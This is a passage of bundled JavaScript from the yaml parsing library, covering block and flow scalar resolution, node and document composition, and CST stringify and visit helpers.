    if (chompStart === 0) {
      const value2 = header.chomp === "+" && lines.length > 0 ? `
`.repeat(Math.max(1, lines.length - 1)) : "";
      let end2 = start + header.length;
      if (scalar.source)
        end2 += scalar.source.length;
      return { value: value2, type, comment: header.comment, range: [start, end2, end2] };
    }
    let trimIndent = scalar.indent + header.indent;
    let offset = scalar.offset + header.length;
    let contentStart = 0;
    for (let i = 0;i < chompStart; ++i) {
      const [indent, content] = lines[i];
      if (content === "" || content === "\r") {
        if (header.indent === 0 && indent.length > trimIndent)
          trimIndent = indent.length;
      } else {
        if (indent.length < trimIndent) {
          const message = "Block scalars with more-indented leading empty lines must use an explicit indentation indicator";
          onError(offset + indent.length, "MISSING_CHAR", message);
        }
        if (header.indent === 0)
          trimIndent = indent.length;
        contentStart = i;
        if (trimIndent === 0 && !ctx.atRoot) {
          const message = "Block scalar values in collections must be indented";
          onError(offset, "BAD_INDENT", message);
        }
        break;
      }
      offset += indent.length + content.length + 1;
    }
    for (let i = lines.length - 1;i >= chompStart; --i) {
      if (lines[i][0].length > trimIndent)
        chompStart = i + 1;
    }
    let value = "";
    let sep = "";
    let prevMoreIndented = false;
    for (let i = 0;i < contentStart; ++i)
      value += lines[i][0].slice(trimIndent) + `
`;
    for (let i = contentStart;i < chompStart; ++i) {
      let [indent, content] = lines[i];
      offset += indent.length + content.length + 1;
      const crlf = content[content.length - 1] === "\r";
      if (crlf)
        content = content.slice(0, -1);
      if (content && indent.length < trimIndent) {
        const src = header.indent ? "explicit indentation indicator" : "first line";
        const message = `Block scalar lines must not be less indented than their ${src}`;
        onError(offset - content.length - (crlf ? 2 : 1), "BAD_INDENT", message);
        indent = "";
      }
      if (type === Scalar.Scalar.BLOCK_LITERAL) {
        value += sep + indent.slice(trimIndent) + content;
        sep = `
`;
      } else if (indent.length > trimIndent || content[0] === "\t") {
        if (sep === " ")
          sep = `
`;
        else if (!prevMoreIndented && sep === `
`)
          sep = `

`;
        value += sep + indent.slice(trimIndent) + content;
        sep = `
`;
        prevMoreIndented = true;
      } else if (content === "") {
        if (sep === `
`)
          value += `
`;
        else
          sep = `
`;
      } else {
        value += sep + content;
        sep = " ";
        prevMoreIndented = false;
      }
    }
    switch (header.chomp) {
      case "-":
        break;
      case "+":
        for (let i = chompStart;i < lines.length; ++i)
          value += `
` + lines[i][0].slice(trimIndent);
        if (value[value.length - 1] !== `
`)
          value += `
`;
        break;
      default:
        value += `
`;
    }
    const end = start + header.length + scalar.source.length;
    return { value, type, comment: header.comment, range: [start, end, end] };
  }
  function parseBlockScalarHeader({ offset, props }, strict, onError) {
    if (props[0].type !== "block-scalar-header") {
      onError(props[0], "IMPOSSIBLE", "Block scalar header not found");
      return null;
    }
    const { source } = props[0];
    const mode = source[0];
    let indent = 0;
    let chomp = "";
    let error48 = -1;
    for (let i = 1;i < source.length; ++i) {
      const ch = source[i];
      if (!chomp && (ch === "-" || ch === "+"))
        chomp = ch;
      else {
        const n = Number(ch);
        if (!indent && n)
          indent = n;
        else if (error48 === -1)
          error48 = offset + i;
      }
    }
    if (error48 !== -1)
      onError(error48, "UNEXPECTED_TOKEN", `Block scalar header includes extra characters: ${source}`);
    let hasSpace = false;
    let comment = "";
    let length = source.length;
    for (let i = 1;i < props.length; ++i) {
      const token = props[i];
      switch (token.type) {
        case "space":
          hasSpace = true;
        case "newline":
          length += token.source.length;
          break;
        case "comment":
          if (strict && !hasSpace) {
            const message = "Comments must be separated from other tokens by white space characters";
            onError(token, "MISSING_CHAR", message);
          }
          length += token.source.length;
          comment = token.source.substring(1);
          break;
        case "error":
          onError(token, "UNEXPECTED_TOKEN", token.message);
          length += token.source.length;
          break;
        default: {
          const message = `Unexpected token in block scalar header: ${token.type}`;
          onError(token, "UNEXPECTED_TOKEN", message);
          const ts = token.source;
          if (ts && typeof ts === "string")
            length += ts.length;
        }
      }
    }
    return { mode, indent, chomp, comment, length };
  }
  function splitLines(source) {
    const split = source.split(/\n( *)/);
    const first = split[0];
    const m = first.match(/^( *)/);
    const line0 = m?.[1] ? [m[1], first.slice(m[1].length)] : ["", first];
    const lines = [line0];
    for (let i = 1;i < split.length; i += 2)
      lines.push([split[i], split[i + 1]]);
    return lines;
  }
  exports.resolveBlockScalar = resolveBlockScalar;
});

// node_modules/yaml/dist/compose/resolve-flow-scalar.js
var require_resolve_flow_scalar = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var resolveEnd = require_resolve_end();
  function resolveFlowScalar(scalar, strict, onError) {
    const { offset, type, source, end } = scalar;
    let _type;
    let value;
    const _onError = (rel, code, msg) => onError(offset + rel, code, msg);
    switch (type) {
      case "scalar":
        _type = Scalar.Scalar.PLAIN;
        value = plainValue(source, _onError);
        break;
      case "single-quoted-scalar":
        _type = Scalar.Scalar.QUOTE_SINGLE;
        value = singleQuotedValue(source, _onError);
        break;
      case "double-quoted-scalar":
        _type = Scalar.Scalar.QUOTE_DOUBLE;
        value = doubleQuotedValue(source, _onError);
        break;
      default:
        onError(scalar, "UNEXPECTED_TOKEN", `Expected a flow scalar value, but found: ${type}`);
        return {
          value: "",
          type: null,
          comment: "",
          range: [offset, offset + source.length, offset + source.length]
        };
    }
    const valueEnd = offset + source.length;
    const re = resolveEnd.resolveEnd(end, valueEnd, strict, onError);
    return {
      value,
      type: _type,
      comment: re.comment,
      range: [offset, valueEnd, re.offset]
    };
  }
  function plainValue(source, onError) {
    let badChar = "";
    switch (source[0]) {
      case "\t":
        badChar = "a tab character";
        break;
      case ",":
        badChar = "flow indicator character ,";
        break;
      case "%":
        badChar = "directive indicator character %";
        break;
      case "|":
      case ">": {
        badChar = `block scalar indicator ${source[0]}`;
        break;
      }
      case "@":
      case "`": {
        badChar = `reserved character ${source[0]}`;
        break;
      }
    }
    if (badChar)
      onError(0, "BAD_SCALAR_START", `Plain value cannot start with ${badChar}`);
    return foldLines(source);
  }
  function singleQuotedValue(source, onError) {
    if (source[source.length - 1] !== "'" || source.length === 1)
      onError(source.length, "MISSING_CHAR", "Missing closing 'quote");
    return foldLines(source.slice(1, -1)).replace(/''/g, "'");
  }
  function foldLines(source) {
    let first, line;
    try {
      first = new RegExp(`(.*?)(?<![ 	])[ 	]*\r?
`, "sy");
      line = new RegExp(`[ 	]*(.*?)(?:(?<![ 	])[ 	]*)?\r?
`, "sy");
    } catch {
      first = /(.*?)[ \t]*\r?\n/sy;
      line = /[ \t]*(.*?)[ \t]*\r?\n/sy;
    }
    let match = first.exec(source);
    if (!match)
      return source;
    let res = match[1];
    let sep = " ";
    let pos = first.lastIndex;
    line.lastIndex = pos;
    while (match = line.exec(source)) {
      if (match[1] === "") {
        if (sep === `
`)
          res += sep;
        else
          sep = `
`;
      } else {
        res += sep + match[1];
        sep = " ";
      }
      pos = line.lastIndex;
    }
    const last = /[ \t]*(.*)/sy;
    last.lastIndex = pos;
    match = last.exec(source);
    return res + sep + (match?.[1] ?? "");
  }
  function doubleQuotedValue(source, onError) {
    let res = "";
    for (let i = 1;i < source.length - 1; ++i) {
      const ch = source[i];
      if (ch === "\r" && source[i + 1] === `
`)
        continue;
      if (ch === `
`) {
        const { fold, offset } = foldNewline(source, i);
        res += fold;
        i = offset;
      } else if (ch === "\\") {
        let next = source[++i];
        const cc = escapeCodes[next];
        if (cc)
          res += cc;
        else if (next === `
`) {
          next = source[i + 1];
          while (next === " " || next === "\t")
            next = source[++i + 1];
        } else if (next === "\r" && source[i + 1] === `
`) {
          next = source[++i + 1];
          while (next === " " || next === "\t")
            next = source[++i + 1];
        } else if (next === "x" || next === "u" || next === "U") {
          const length = { x: 2, u: 4, U: 8 }[next];
          res += parseCharCode(source, i + 1, length, onError);
          i += length;
        } else {
          const raw = source.substr(i - 1, 2);
          onError(i - 1, "BAD_DQ_ESCAPE", `Invalid escape sequence ${raw}`);
          res += raw;
        }
      } else if (ch === " " || ch === "\t") {
        const wsStart = i;
        let next = source[i + 1];
        while (next === " " || next === "\t")
          next = source[++i + 1];
        if (next !== `
` && !(next === "\r" && source[i + 2] === `
`))
          res += i > wsStart ? source.slice(wsStart, i + 1) : ch;
      } else {
        res += ch;
      }
    }
    if (source[source.length - 1] !== '"' || source.length === 1)
      onError(source.length, "MISSING_CHAR", 'Missing closing "quote');
    return res;
  }
  function foldNewline(source, offset) {
    let fold = "";
    let ch = source[offset + 1];
    while (ch === " " || ch === "\t" || ch === `
` || ch === "\r") {
      if (ch === "\r" && source[offset + 2] !== `
`)
        break;
      if (ch === `
`)
        fold += `
`;
      offset += 1;
      ch = source[offset + 1];
    }
    if (!fold)
      fold = " ";
    return { fold, offset };
  }
  var escapeCodes = {
    "0": "\x00",
    a: "\x07",
    b: "\b",
    e: "\x1B",
    f: "\f",
    n: `
`,
    r: "\r",
    t: "\t",
    v: "\v",
    N: "\x85",
    _: "\xA0",
    L: "\u2028",
    P: "\u2029",
    " ": " ",
    '"': '"',
    "/": "/",
    "\\": "\\",
    "\t": "\t"
  };
  function parseCharCode(source, offset, length, onError) {
    const cc = source.substr(offset, length);
    const ok = cc.length === length && /^[0-9a-fA-F]+$/.test(cc);
    const code = ok ? parseInt(cc, 16) : NaN;
    if (isNaN(code)) {
      const raw = source.substr(offset - 2, length + 2);
      onError(offset - 2, "BAD_DQ_ESCAPE", `Invalid escape sequence ${raw}`);
      return raw;
    }
    return String.fromCodePoint(code);
  }
  exports.resolveFlowScalar = resolveFlowScalar;
});

// node_modules/yaml/dist/compose/compose-scalar.js
var require_compose_scalar = __commonJS((exports) => {
  var identity = require_identity();
  var Scalar = require_Scalar();
  var resolveBlockScalar = require_resolve_block_scalar();
  var resolveFlowScalar = require_resolve_flow_scalar();
  function composeScalar(ctx, token, tagToken, onError) {
    const { value, type, comment, range } = token.type === "block-scalar" ? resolveBlockScalar.resolveBlockScalar(ctx, token, onError) : resolveFlowScalar.resolveFlowScalar(token, ctx.options.strict, onError);
    const tagName = tagToken ? ctx.directives.tagName(tagToken.source, (msg) => onError(tagToken, "TAG_RESOLVE_FAILED", msg)) : null;
    let tag;
    if (ctx.options.stringKeys && ctx.atKey) {
      tag = ctx.schema[identity.SCALAR];
    } else if (tagName)
      tag = findScalarTagByName(ctx.schema, value, tagName, tagToken, onError);
    else if (token.type === "scalar")
      tag = findScalarTagByTest(ctx, value, token, onError);
    else
      tag = ctx.schema[identity.SCALAR];
    let scalar;
    try {
      const res = tag.resolve(value, (msg) => onError(tagToken ?? token, "TAG_RESOLVE_FAILED", msg), ctx.options);
      scalar = identity.isScalar(res) ? res : new Scalar.Scalar(res);
    } catch (error48) {
      const msg = error48 instanceof Error ? error48.message : String(error48);
      onError(tagToken ?? token, "TAG_RESOLVE_FAILED", msg);
      scalar = new Scalar.Scalar(value);
    }
    scalar.range = range;
    scalar.source = value;
    if (type)
      scalar.type = type;
    if (tagName)
      scalar.tag = tagName;
    if (tag.format)
      scalar.format = tag.format;
    if (comment)
      scalar.comment = comment;
    return scalar;
  }
  function findScalarTagByName(schema, value, tagName, tagToken, onError) {
    if (tagName === "!")
      return schema[identity.SCALAR];
    const matchWithTest = [];
    for (const tag of schema.tags) {
      if (!tag.collection && tag.tag === tagName) {
        if (tag.default && tag.test)
          matchWithTest.push(tag);
        else
          return tag;
      }
    }
    for (const tag of matchWithTest)
      if (tag.test?.test(value))
        return tag;
    const kt = schema.knownTags[tagName];
    if (kt && !kt.collection) {
      schema.tags.push(Object.assign({}, kt, { default: false, test: undefined }));
      return kt;
    }
    onError(tagToken, "TAG_RESOLVE_FAILED", `Unresolved tag: ${tagName}`, tagName !== "tag:yaml.org,2002:str");
    return schema[identity.SCALAR];
  }
  function findScalarTagByTest({ atKey, directives, schema }, value, token, onError) {
    const tag = schema.tags.find((tag2) => (tag2.default === true || atKey && tag2.default === "key") && tag2.test?.test(value)) || schema[identity.SCALAR];
    if (schema.compat) {
      const compat2 = schema.compat.find((tag2) => tag2.default && tag2.test?.test(value)) ?? schema[identity.SCALAR];
      if (tag.tag !== compat2.tag) {
        const ts = directives.tagString(tag.tag);
        const cs = directives.tagString(compat2.tag);
        const msg = `Value may be parsed as either ${ts} or ${cs}`;
        onError(token, "TAG_RESOLVE_FAILED", msg, true);
      }
    }
    return tag;
  }
  exports.composeScalar = composeScalar;
});

// node_modules/yaml/dist/compose/util-empty-scalar-position.js
var require_util_empty_scalar_position = __commonJS((exports) => {
  function emptyScalarPosition(offset, before, pos) {
    if (before) {
      pos ?? (pos = before.length);
      for (let i = pos - 1;i >= 0; --i) {
        let st = before[i];
        switch (st.type) {
          case "space":
          case "comment":
          case "newline":
            offset -= st.source.length;
            continue;
        }
        st = before[++i];
        while (st?.type === "space") {
          offset += st.source.length;
          st = before[++i];
        }
        break;
      }
    }
    return offset;
  }
  exports.emptyScalarPosition = emptyScalarPosition;
});

// node_modules/yaml/dist/compose/compose-node.js
var require_compose_node = __commonJS((exports) => {
  var Alias = require_Alias();
  var identity = require_identity();
  var composeCollection = require_compose_collection();
  var composeScalar = require_compose_scalar();
  var resolveEnd = require_resolve_end();
  var utilEmptyScalarPosition = require_util_empty_scalar_position();
  var CN = { composeNode, composeEmptyNode };
  function composeNode(ctx, token, props, onError) {
    const atKey = ctx.atKey;
    const { spaceBefore, comment, anchor, tag } = props;
    let node;
    let isSrcToken = true;
    switch (token.type) {
      case "alias":
        node = composeAlias(ctx, token, onError);
        if (anchor || tag)
          onError(token, "ALIAS_PROPS", "An alias node must not specify any properties");
        break;
      case "scalar":
      case "single-quoted-scalar":
      case "double-quoted-scalar":
      case "block-scalar":
        node = composeScalar.composeScalar(ctx, token, tag, onError);
        if (anchor)
          node.anchor = anchor.source.substring(1);
        break;
      case "block-map":
      case "block-seq":
      case "flow-collection":
        node = composeCollection.composeCollection(CN, ctx, token, props, onError);
        if (anchor)
          node.anchor = anchor.source.substring(1);
        break;
      default: {
        const message = token.type === "error" ? token.message : `Unsupported token (type: ${token.type})`;
        onError(token, "UNEXPECTED_TOKEN", message);
        node = composeEmptyNode(ctx, token.offset, undefined, null, props, onError);
        isSrcToken = false;
      }
    }
    if (anchor && node.anchor === "")
      onError(anchor, "BAD_ALIAS", "Anchor cannot be an empty string");
    if (atKey && ctx.options.stringKeys && (!identity.isScalar(node) || typeof node.value !== "string" || node.tag && node.tag !== "tag:yaml.org,2002:str")) {
      const msg = "With stringKeys, all keys must be strings";
      onError(tag ?? token, "NON_STRING_KEY", msg);
    }
    if (spaceBefore)
      node.spaceBefore = true;
    if (comment) {
      if (token.type === "scalar" && token.source === "")
        node.comment = comment;
      else
        node.commentBefore = comment;
    }
    if (ctx.options.keepSourceTokens && isSrcToken)
      node.srcToken = token;
    return node;
  }
  function composeEmptyNode(ctx, offset, before, pos, { spaceBefore, comment, anchor, tag, end }, onError) {
    const token = {
      type: "scalar",
      offset: utilEmptyScalarPosition.emptyScalarPosition(offset, before, pos),
      indent: -1,
      source: ""
    };
    const node = composeScalar.composeScalar(ctx, token, tag, onError);
    if (anchor) {
      node.anchor = anchor.source.substring(1);
      if (node.anchor === "")
        onError(anchor, "BAD_ALIAS", "Anchor cannot be an empty string");
    }
    if (spaceBefore)
      node.spaceBefore = true;
    if (comment) {
      node.comment = comment;
      node.range[2] = end;
    }
    return node;
  }
  function composeAlias({ options }, { offset, source, end }, onError) {
    const alias = new Alias.Alias(source.substring(1));
    if (alias.source === "")
      onError(offset, "BAD_ALIAS", "Alias cannot be an empty string");
    if (alias.source.endsWith(":"))
      onError(offset + source.length - 1, "BAD_ALIAS", "Alias ending in : is ambiguous", true);
    const valueEnd = offset + source.length;
    const re = resolveEnd.resolveEnd(end, valueEnd, options.strict, onError);
    alias.range = [offset, valueEnd, re.offset];
    if (re.comment)
      alias.comment = re.comment;
    return alias;
  }
  exports.composeEmptyNode = composeEmptyNode;
  exports.composeNode = composeNode;
});

// node_modules/yaml/dist/compose/compose-doc.js
var require_compose_doc = __commonJS((exports) => {
  var Document = require_Document();
  var composeNode = require_compose_node();
  var resolveEnd = require_resolve_end();
  var resolveProps = require_resolve_props();
  function composeDoc(options, directives, { offset, start, value, end }, onError) {
    const opts = Object.assign({ _directives: directives }, options);
    const doc2 = new Document.Document(undefined, opts);
    const ctx = {
      atKey: false,
      atRoot: true,
      directives: doc2.directives,
      options: doc2.options,
      schema: doc2.schema
    };
    const props = resolveProps.resolveProps(start, {
      indicator: "doc-start",
      next: value ?? end?.[0],
      offset,
      onError,
      parentIndent: 0,
      startOnNewline: true
    });
    if (props.found) {
      doc2.directives.docStart = true;
      if (value && (value.type === "block-map" || value.type === "block-seq") && !props.hasNewline)
        onError(props.end, "MISSING_CHAR", "Block collection cannot start on same line with directives-end marker");
    }
    doc2.contents = value ? composeNode.composeNode(ctx, value, props, onError) : composeNode.composeEmptyNode(ctx, props.end, start, null, props, onError);
    const contentEnd = doc2.contents.range[2];
    const re = resolveEnd.resolveEnd(end, contentEnd, false, onError);
    if (re.comment)
      doc2.comment = re.comment;
    doc2.range = [offset, contentEnd, re.offset];
    return doc2;
  }
  exports.composeDoc = composeDoc;
});

// node_modules/yaml/dist/compose/composer.js
var require_composer = __commonJS((exports) => {
  var node_process = __require("process");
  var directives = require_directives();
  var Document = require_Document();
  var errors3 = require_errors();
  var identity = require_identity();
  var composeDoc = require_compose_doc();
  var resolveEnd = require_resolve_end();
  function getErrorPos(src) {
    if (typeof src === "number")
      return [src, src + 1];
    if (Array.isArray(src))
      return src.length === 2 ? src : [src[0], src[1]];
    const { offset, source } = src;
    return [offset, offset + (typeof source === "string" ? source.length : 1)];
  }
  function parsePrelude(prelude) {
    let comment = "";
    let atComment = false;
    let afterEmptyLine = false;
    for (let i = 0;i < prelude.length; ++i) {
      const source = prelude[i];
      switch (source[0]) {
        case "#":
          comment += (comment === "" ? "" : afterEmptyLine ? `

` : `
`) + (source.substring(1) || " ");
          atComment = true;
          afterEmptyLine = false;
          break;
        case "%":
          if (prelude[i + 1]?.[0] !== "#")
            i += 1;
          atComment = false;
          break;
        default:
          if (!atComment)
            afterEmptyLine = true;
          atComment = false;
      }
    }
    return { comment, afterEmptyLine };
  }

  class Composer {
    constructor(options = {}) {
      this.doc = null;
      this.atDirectives = false;
      this.prelude = [];
      this.errors = [];
      this.warnings = [];
      this.onError = (source, code, message, warning) => {
        const pos = getErrorPos(source);
        if (warning)
          this.warnings.push(new errors3.YAMLWarning(pos, code, message));
        else
          this.errors.push(new errors3.YAMLParseError(pos, code, message));
      };
      this.directives = new directives.Directives({ version: options.version || "1.2" });
      this.options = options;
    }
    decorate(doc2, afterDoc) {
      const { comment, afterEmptyLine } = parsePrelude(this.prelude);
      if (comment) {
        const dc = doc2.contents;
        if (afterDoc) {
          doc2.comment = doc2.comment ? `${doc2.comment}
${comment}` : comment;
        } else if (afterEmptyLine || doc2.directives.docStart || !dc) {
          doc2.commentBefore = comment;
        } else if (identity.isCollection(dc) && !dc.flow && dc.items.length > 0) {
          let it = dc.items[0];
          if (identity.isPair(it))
            it = it.key;
          const cb = it.commentBefore;
          it.commentBefore = cb ? `${comment}
${cb}` : comment;
        } else {
          const cb = dc.commentBefore;
          dc.commentBefore = cb ? `${comment}
${cb}` : comment;
        }
      }
      if (afterDoc) {
        Array.prototype.push.apply(doc2.errors, this.errors);
        Array.prototype.push.apply(doc2.warnings, this.warnings);
      } else {
        doc2.errors = this.errors;
        doc2.warnings = this.warnings;
      }
      this.prelude = [];
      this.errors = [];
      this.warnings = [];
    }
    streamInfo() {
      return {
        comment: parsePrelude(this.prelude).comment,
        directives: this.directives,
        errors: this.errors,
        warnings: this.warnings
      };
    }
    *compose(tokens, forceDoc = false, endOffset = -1) {
      for (const token of tokens)
        yield* this.next(token);
      yield* this.end(forceDoc, endOffset);
    }
    *next(token) {
      if (node_process.env.LOG_STREAM)
        console.dir(token, { depth: null });
      switch (token.type) {
        case "directive":
          this.directives.add(token.source, (offset, message, warning) => {
            const pos = getErrorPos(token);
            pos[0] += offset;
            this.onError(pos, "BAD_DIRECTIVE", message, warning);
          });
          this.prelude.push(token.source);
          this.atDirectives = true;
          break;
        case "document": {
          const doc2 = composeDoc.composeDoc(this.options, this.directives, token, this.onError);
          if (this.atDirectives && !doc2.directives.docStart)
            this.onError(token, "MISSING_CHAR", "Missing directives-end/doc-start indicator line");
          this.decorate(doc2, false);
          if (this.doc)
            yield this.doc;
          this.doc = doc2;
          this.atDirectives = false;
          break;
        }
        case "byte-order-mark":
        case "space":
          break;
        case "comment":
        case "newline":
          this.prelude.push(token.source);
          break;
        case "error": {
          const msg = token.source ? `${token.message}: ${JSON.stringify(token.source)}` : token.message;
          const error48 = new errors3.YAMLParseError(getErrorPos(token), "UNEXPECTED_TOKEN", msg);
          if (this.atDirectives || !this.doc)
            this.errors.push(error48);
          else
            this.doc.errors.push(error48);
          break;
        }
        case "doc-end": {
          if (!this.doc) {
            const msg = "Unexpected doc-end without preceding document";
            this.errors.push(new errors3.YAMLParseError(getErrorPos(token), "UNEXPECTED_TOKEN", msg));
            break;
          }
          this.doc.directives.docEnd = true;
          const end = resolveEnd.resolveEnd(token.end, token.offset + token.source.length, this.doc.options.strict, this.onError);
          this.decorate(this.doc, true);
          if (end.comment) {
            const dc = this.doc.comment;
            this.doc.comment = dc ? `${dc}
${end.comment}` : end.comment;
          }
          this.doc.range[2] = end.offset;
          break;
        }
        default:
          this.errors.push(new errors3.YAMLParseError(getErrorPos(token), "UNEXPECTED_TOKEN", `Unsupported token ${token.type}`));
      }
    }
    *end(forceDoc = false, endOffset = -1) {
      if (this.doc) {
        this.decorate(this.doc, true);
        yield this.doc;
        this.doc = null;
      } else if (forceDoc) {
        const opts = Object.assign({ _directives: this.directives }, this.options);
        const doc2 = new Document.Document(undefined, opts);
        if (this.atDirectives)
          this.onError(endOffset, "MISSING_CHAR", "Missing directives-end indicator line");
        doc2.range = [0, endOffset, endOffset];
        this.decorate(doc2, false);
        yield doc2;
      }
    }
  }
  exports.Composer = Composer;
});

// node_modules/yaml/dist/parse/cst-scalar.js
var require_cst_scalar = __commonJS((exports) => {
  var resolveBlockScalar = require_resolve_block_scalar();
  var resolveFlowScalar = require_resolve_flow_scalar();
  var errors3 = require_errors();
  var stringifyString = require_stringifyString();
  function resolveAsScalar(token, strict = true, onError) {
    if (token) {
      const _onError = (pos, code, message) => {
        const offset = typeof pos === "number" ? pos : Array.isArray(pos) ? pos[0] : pos.offset;
        if (onError)
          onError(offset, code, message);
        else
          throw new errors3.YAMLParseError([offset, offset + 1], code, message);
      };
      switch (token.type) {
        case "scalar":
        case "single-quoted-scalar":
        case "double-quoted-scalar":
          return resolveFlowScalar.resolveFlowScalar(token, strict, _onError);
        case "block-scalar":
          return resolveBlockScalar.resolveBlockScalar({ options: { strict } }, token, _onError);
      }
    }
    return null;
  }
  function createScalarToken(value, context) {
    const { implicitKey = false, indent, inFlow = false, offset = -1, type = "PLAIN" } = context;
    const source = stringifyString.stringifyString({ type, value }, {
      implicitKey,
      indent: indent > 0 ? " ".repeat(indent) : "",
      inFlow,
      options: { blockQuote: true, lineWidth: -1 }
    });
    const end = context.end ?? [
      { type: "newline", offset: -1, indent, source: `
` }
    ];
    switch (source[0]) {
      case "|":
      case ">": {
        const he = source.indexOf(`
`);
        const head = source.substring(0, he);
        const body = source.substring(he + 1) + `
`;
        const props = [
          { type: "block-scalar-header", offset, indent, source: head }
        ];
        if (!addEndtoBlockProps(props, end))
          props.push({ type: "newline", offset: -1, indent, source: `
` });
        return { type: "block-scalar", offset, indent, props, source: body };
      }
      case '"':
        return { type: "double-quoted-scalar", offset, indent, source, end };
      case "'":
        return { type: "single-quoted-scalar", offset, indent, source, end };
      default:
        return { type: "scalar", offset, indent, source, end };
    }
  }
  function setScalarValue(token, value, context = {}) {
    let { afterKey = false, implicitKey = false, inFlow = false, type } = context;
    let indent = "indent" in token ? token.indent : null;
    if (afterKey && typeof indent === "number")
      indent += 2;
    if (!type)
      switch (token.type) {
        case "single-quoted-scalar":
          type = "QUOTE_SINGLE";
          break;
        case "double-quoted-scalar":
          type = "QUOTE_DOUBLE";
          break;
        case "block-scalar": {
          const header = token.props[0];
          if (header.type !== "block-scalar-header")
            throw new Error("Invalid block scalar header");
          type = header.source[0] === ">" ? "BLOCK_FOLDED" : "BLOCK_LITERAL";
          break;
        }
        default:
          type = "PLAIN";
      }
    const source = stringifyString.stringifyString({ type, value }, {
      implicitKey: implicitKey || indent === null,
      indent: indent !== null && indent > 0 ? " ".repeat(indent) : "",
      inFlow,
      options: { blockQuote: true, lineWidth: -1 }
    });
    switch (source[0]) {
      case "|":
      case ">":
        setBlockScalarValue(token, source);
        break;
      case '"':
        setFlowScalarValue(token, source, "double-quoted-scalar");
        break;
      case "'":
        setFlowScalarValue(token, source, "single-quoted-scalar");
        break;
      default:
        setFlowScalarValue(token, source, "scalar");
    }
  }
  function setBlockScalarValue(token, source) {
    const he = source.indexOf(`
`);
    const head = source.substring(0, he);
    const body = source.substring(he + 1) + `
`;
    if (token.type === "block-scalar") {
      const header = token.props[0];
      if (header.type !== "block-scalar-header")
        throw new Error("Invalid block scalar header");
      header.source = head;
      token.source = body;
    } else {
      const { offset } = token;
      const indent = "indent" in token ? token.indent : -1;
      const props = [
        { type: "block-scalar-header", offset, indent, source: head }
      ];
      if (!addEndtoBlockProps(props, "end" in token ? token.end : undefined))
        props.push({ type: "newline", offset: -1, indent, source: `
` });
      for (const key of Object.keys(token))
        if (key !== "type" && key !== "offset")
          delete token[key];
      Object.assign(token, { type: "block-scalar", indent, props, source: body });
    }
  }
  function addEndtoBlockProps(props, end) {
    if (end)
      for (const st of end)
        switch (st.type) {
          case "space":
          case "comment":
            props.push(st);
            break;
          case "newline":
            props.push(st);
            return true;
        }
    return false;
  }
  function setFlowScalarValue(token, source, type) {
    switch (token.type) {
      case "scalar":
      case "double-quoted-scalar":
      case "single-quoted-scalar":
        token.type = type;
        token.source = source;
        break;
      case "block-scalar": {
        const end = token.props.slice(1);
        let oa = source.length;
        if (token.props[0].type === "block-scalar-header")
          oa -= token.props[0].source.length;
        for (const tok of end)
          tok.offset += oa;
        delete token.props;
        Object.assign(token, { type, source, end });
        break;
      }
      case "block-map":
      case "block-seq": {
        const offset = token.offset + source.length;
        const nl = { type: "newline", offset, indent: token.indent, source: `
` };
        delete token.items;
        Object.assign(token, { type, source, end: [nl] });
        break;
      }
      default: {
        const indent = "indent" in token ? token.indent : -1;
        const end = "end" in token && Array.isArray(token.end) ? token.end.filter((st) => st.type === "space" || st.type === "comment" || st.type === "newline") : [];
        for (const key of Object.keys(token))
          if (key !== "type" && key !== "offset")
            delete token[key];
        Object.assign(token, { type, indent, source, end });
      }
    }
  }
  exports.createScalarToken = createScalarToken;
  exports.resolveAsScalar = resolveAsScalar;
  exports.setScalarValue = setScalarValue;
});

// node_modules/yaml/dist/parse/cst-stringify.js
var require_cst_stringify = __commonJS((exports) => {
  var stringify = (cst) => ("type" in cst) ? stringifyToken(cst) : stringifyItem(cst);
  function stringifyToken(token) {
    switch (token.type) {
      case "block-scalar": {
        let res = "";
        for (const tok of token.props)
          res += stringifyToken(tok);
        return res + token.source;
      }
      case "block-map":
      case "block-seq": {
        let res = "";
        for (const item of token.items)
          res += stringifyItem(item);
        return res;
      }
      case "flow-collection": {
        let res = token.start.source;
        for (const item of token.items)
          res += stringifyItem(item);
        for (const st of token.end)
          res += st.source;
        return res;
      }
      case "document": {
        let res = stringifyItem(token);
        if (token.end)
          for (const st of token.end)
            res += st.source;
        return res;
      }
      default: {
        let res = token.source;
        if ("end" in token && token.end)
          for (const st of token.end)
            res += st.source;
        return res;
      }
    }
  }
  function stringifyItem({ start, key, sep, value }) {
    let res = "";
    for (const st of start)
      res += st.source;
    if (key)
      res += stringifyToken(key);
    if (sep)
      for (const st of sep)
        res += st.source;
    if (value)
      res += stringifyToken(value);
    return res;
  }
  exports.stringify = stringify;
});

// node_modules/yaml/dist/parse/cst-visit.js
var require_cst_visit = __commonJS((exports) => {
  var BREAK = Symbol("break visit");
  var SKIP = Symbol("skip children");
  var REMOVE = Symbol("remove item");
  function visit(cst, visitor) {
    if ("type" in cst && cst.type === "document")
      cst = { start: cst.start, value: cst.value };
    _visit(Object.freeze([]), cst, visitor);
  }
  visit.BREAK = BREAK;
  visit.SKIP = SKIP;
  visit.REMOVE = REMOVE;
  visit.itemAtPath = (cst, path) => {
    let item = cst;
    for (const [field, index] of path) {
      const tok = item?.[field];
      if (tok && "items" in tok) {
        item = tok.items[index];
      } else
        return;
    }
    return item;
  };
  visit.parentCollection = (cst, path) => {
    const parent = visit.itemAtPath(cst, path.slice(0, -1));
    const field = path[path.length - 1][0];
    const coll = parent?.[field];
    if (coll && "items" in coll)
      return coll;
    throw new Error("Parent collection not found");
  };
  function _visit(path, item, visitor) {
    let ctrl = visitor(item, path);
    if (typeof ctrl === "symbol")
      return ctrl;
    for (const field of ["key", "value"]) {
      const token = item[field];
      if (token && "items" in token) {
        for (let i = 0;i < token.items.length; ++i) {
          const ci = _visit(Object.freeze(path.concat([[field, i]])), token.items[i], visitor);
          if (typeof ci === "number")
            i = ci - 1;
          else if (ci === BREAK)
            return BREAK;
          else if (ci === REMOVE) {
            token.items.splice(i, 1);
            i -= 1;
          }
        }
        if (typeof ctrl === "function" && field === "key")
          ctrl = ctrl(item, path);
      }
    }
    return typeof ctrl === "function" ? ctrl(item, path) : ctrl;
  }
  exports.visit = visit;
});

// node_modules/yaml/dist/parse/cst.js
var require_cst = __commonJS((exports) => {
  var cstScalar = require_cst_scalar();
  var cstStringify = require_cst_stringify();
  var cstVisit = require_cst_visit();
  var BOM = "\uFEFF";
  var DOCUMENT = "\x02";
  var FLOW_END = "\x18";
  var SCALAR = "\x1F";
  var isCollection = (token) => !!token && ("items" in token);
